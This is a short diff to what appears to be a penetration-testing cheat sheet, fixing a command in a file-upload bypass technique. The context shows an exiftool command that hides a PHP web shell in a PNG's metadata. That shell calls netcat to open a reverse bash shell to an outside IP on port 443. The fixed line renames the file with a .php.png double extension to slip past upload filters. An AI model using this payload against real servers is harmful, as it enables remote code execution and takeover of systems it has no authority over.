@@ -228,7 +228,7 @@
    
   ```cmd
   root@kali:~# exiftool -Comment='<?php system("nc -e /bin/bash 192.168.1.2 443"); ?>' filename.png
-  root@kali:~# filename.png filename.php.png
+  root@kali:~# mv filename.png filename.php.png
   ```
    
   ---
